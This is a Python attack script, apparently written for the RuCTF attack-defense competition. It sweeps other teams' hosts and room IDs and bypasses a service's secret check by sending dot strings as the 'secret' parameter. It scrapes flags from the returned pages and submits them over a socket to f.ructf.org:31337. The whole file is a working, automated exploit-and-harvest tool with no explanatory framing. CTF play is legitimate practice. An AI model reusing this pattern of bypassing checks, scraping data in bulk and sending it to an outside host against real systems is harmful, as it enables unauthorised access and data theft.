import tornado.ioloop
from tornado.escape import *
from tornado.httpclient import *
from tornado import gen

import socket

url = "http://10.23.{}.3:3000/checkrooms/{}"

SLEEP = 0.0123124


headers = {
		"Content-Type":"application/x-www-form-urlencoded",
		"User-Agent":"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
		}


async def get_flag(url):
	client = AsyncHTTPClient()
	ret = []
	for x in range(1, 10):
		sec = ''.join('.' for _ in range(x))

		u = url+"?secret=" + sec
		#print(u)

		req = HTTPRequest(u, 
							method="GET", 
							headers=headers,
							connect_timeout=SLEEP, 
							follow_redirects=False)

		try:
			slp = gen.sleep(SLEEP)
			resp = await client.fetch(req)
			await slp
		except:
			pass

		flg = ''

		try:
			flg = resp.body.decode("utf-8").split('<p class="checkroom__content">')[1][:32]
		except:
			pass

		#print(flg)
		
		if flg != '':
			ret.append(flg)

	return ret

async def SOCK(flag):
	try:
	    sock = socket.socket()
	    sock.connect(('f.ructf.org', 31337))
	    sock.settimeout(0.3)
	    sock.recv(1024)
	    f = (flag + "\n").encode("utf-8")
	    sock.send(f)
	    print(sock.recv(1024))
	except Exception as e:
		print(e)


async def start(room):
	for team in [6, 21, 7, 18,  22,  9, 11, 15, 20, 14,  19, 16, 1]:
		print(team, room)		
		if team == 10:
			continue
		ur = url.format(team, room)

		slp = gen.sleep(SLEEP)
		flgs = await get_flag(ur)
		print(flgs)

		await slp

		for flg in flgs:
			if flg[-1] == "=":
				slp = gen.sleep(SLEEP)
				await SOCK(flg)
				await slp

		

async def go():
	for room in range(900,950):
		slp = gen.sleep(SLEEP)
		
		await start(room)
		#tornado.ioloop.IOLoop.current().add_callback(start(room))
		await slp

if __name__ == '__main__':

	tornado.ioloop.IOLoop.current().spawn_callback(go)
	tornado.ioloop.IOLoop.current().start()